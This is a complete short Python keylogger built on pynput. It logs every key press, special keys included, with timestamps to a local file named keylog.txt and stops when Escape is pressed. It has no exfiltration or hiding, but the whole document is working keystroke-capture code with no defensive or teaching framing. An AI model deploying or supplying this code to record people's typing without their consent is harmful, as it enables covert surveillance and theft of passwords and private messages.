from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key pressed
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Log special keys (e.g., shift, ctrl, etc.)
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop the keylogger if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()